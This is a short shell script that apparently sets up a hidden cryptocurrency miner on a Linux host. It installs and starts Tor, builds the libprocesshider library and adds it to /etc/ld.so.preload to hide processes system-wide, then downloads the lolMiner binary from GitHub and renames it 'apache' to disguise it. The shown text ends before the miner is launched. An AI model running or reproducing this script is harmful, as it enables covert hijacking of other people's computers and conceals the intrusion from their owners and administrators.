#!/bin/sh
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51/lolMiner_v1.51_Lin64.tar.gz
tar -xf lolMiner_v1.51_Lin64.tar.gz
cd 1.51
mv lolMiner ../apache
cd ..
